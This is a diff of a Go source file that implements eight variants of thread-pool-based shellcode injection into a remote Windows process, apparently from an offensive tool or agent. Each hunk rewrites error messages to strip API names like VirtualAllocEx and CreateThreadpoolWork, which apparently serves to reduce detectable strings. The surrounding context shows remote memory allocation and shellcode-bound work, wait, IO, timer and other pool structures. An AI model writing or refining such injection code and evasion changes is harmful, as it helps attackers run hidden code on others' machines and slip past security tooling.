@@ -703,7 +703,7 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 		0,             // Callback environment
 	)
 	if pTpWork == 0 {
-		return output, fmt.Errorf("CreateThreadpoolWork failed: %v", err)
+		return output, fmt.Errorf("work item creation failed: %v", err)
 	}
 	output += "[+] Created TP_WORK structure associated with shellcode\n"
 
@@ -761,7 +761,7 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 	// Step 10: Allocate memory for TP_WORK in target process
 	tpWorkAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpWork)), PAGE_READWRITE)
 	if err != nil {
-		return output, fmt.Errorf("VirtualAllocEx for TP_WORK failed: %v", err)
+		return output, fmt.Errorf("remote allocation for TP_WORK failed: %v", err)
 	}
 	output += fmt.Sprintf("[+] Allocated TP_WORK memory at: 0x%X\n", tpWorkAddr)
 
@@ -872,7 +872,7 @@ func executeVariant3(shellcode []byte, pid uint32) (string, error) {
 		0,             // Callback environment
 	)
 	if pTpWait == 0 {
-		return output, fmt.Errorf("CreateThreadpoolWait failed: %v", err)
+		return output, fmt.Errorf("wait item creation failed: %v", err)
 	}
 	output += "[+] Created TP_WAIT structure associated with shellcode\n"
 
@@ -880,7 +880,7 @@ func executeVariant3(shellcode []byte, pid uint32) (string, error) {
 	var tpWait FULL_TP_WAIT
 	tpWaitAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpWait)), PAGE_READWRITE)
 	if err != nil {
-		return output, fmt.Errorf("VirtualAllocEx for TP_WAIT failed: %v", err)
+		return output, fmt.Errorf("remote allocation for TP_WAIT failed: %v", err)
 	}
 	output += fmt.Sprintf("[+] Allocated TP_WAIT memory at: 0x%X\n", tpWaitAddr)
 
@@ -897,7 +897,7 @@ func executeVariant3(shellcode []byte, pid uint32) (string, error) {
 	var tpDirect TP_DIRECT
 	tpDirectAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpDirect)), PAGE_READWRITE)
 	if err != nil {
-		return output, fmt.Errorf("VirtualAllocEx for TP_DIRECT failed: %v", err)
+		return output, fmt.Errorf("remote allocation for TP_DIRECT failed: %v", err)
 	}
 	output += fmt.Sprintf("[+] Allocated TP_DIRECT memory at: 0x%X\n", tpDirectAddr)
 
@@ -1014,7 +1014,7 @@ func executeVariant4(shellcode []byte, pid uint32) (string, error) {
 		0,             // Callback environment
 	)
 	if pTpIo == 0 {
-		return output, fmt.Errorf("CreateThreadpoolIo failed: %v", err)
+		return output, fmt.Errorf("IO item creation failed: %v", err)
 	}
 	output += "[+] Created TP_IO structure associated with shellcode\n"
 
@@ -1028,7 +1028,7 @@ func executeVariant4(shellcode []byte, pid uint32) (string, error) {
 	var tpIo FULL_TP_IO
 	tpIoAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpIo)), PAGE_READWRITE)
 	if err != nil {
-		return output, fmt.Errorf("VirtualAllocEx for TP_IO failed: %v", err)
+		return output, fmt.Errorf("remote allocation for TP_IO failed: %v", err)
 	}
 	output += fmt.Sprintf("[+] Allocated TP_IO memory at: 0x%X\n", tpIoAddr)
 
@@ -1188,7 +1188,7 @@ func executeVariant5(shellcode []byte, pid uint32) (string, error) {
 	var tpAlpc FULL_TP_ALPC
 	tpAlpcAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpAlpc)), PAGE_READWRITE)
 	if err != nil {
-		return output, fmt.Errorf("VirtualAllocEx for TP_ALPC failed: %v", err)
+		return output, fmt.Errorf("remote allocation for TP_ALPC failed: %v", err)
 	}
 	output += fmt.Sprintf("[+] Allocated TP_ALPC memory at: 0x%X\n", tpAlpcAddr)
 
@@ -1320,7 +1320,7 @@ func executeVariant6(shellcode []byte, pid uint32) (string, error) {
 	var tpJob FULL_TP_JOB
 	tpJobAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpJob)), PAGE_READWRITE)
 	if err != nil {
-		return output, fmt.Errorf("VirtualAllocEx for TP_JOB failed: %v", err)
+		return output, fmt.Errorf("remote allocation for TP_JOB failed: %v", err)
 	}
 	output += fmt.Sprintf("[+] Allocated TP_JOB memory at: 0x%X\n", tpJobAddr)
 
@@ -1420,7 +1420,7 @@ func executeVariant7(shellcode []byte, pid uint32) (string, error) {
 
 	tpDirectAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpDirect)), PAGE_READWRITE)
 	if err != nil {
-		return output, fmt.Errorf("VirtualAllocEx for TP_DIRECT failed: %v", err)
+		return output, fmt.Errorf("remote allocation for TP_DIRECT failed: %v", err)
 	}
 	_, err = injectWriteMemory(hProcess, tpDirectAddr, tpDirectBytes)
 	if err != nil {
@@ -1511,7 +1511,7 @@ func executeVariant8(shellcode []byte, pid uint32) (string, error) {
 		0,             // Callback environment
 	)
 	if pTpTimer == 0 {
-		return output, fmt.Errorf("CreateThreadpoolTimer failed: %v", err)
+		return output, fmt.Errorf("timer item creation failed: %v", err)
 	}
 	output += "[+] Created TP_TIMER structure associated with shellcode\n"
 
@@ -1519,7 +1519,7 @@ func executeVariant8(shellcode []byte, pid uint32) (string, error) {
 	var tpTimer FULL_TP_TIMER
 	tpTimerAddr, err := injectAllocMemory(hProcess, int(unsafe.Sizeof(tpTimer)), PAGE_READWRITE)
 	if err != nil {
-		return output, fmt.Errorf("VirtualAllocEx for TP_TIMER failed: %v", err)
+		return output, fmt.Errorf("remote allocation for TP_TIMER failed: %v", err)
 	}
 	output += fmt.Sprintf("[+] Allocated TP_TIMER memory at: 0x%X\n", tpTimerAddr)
 
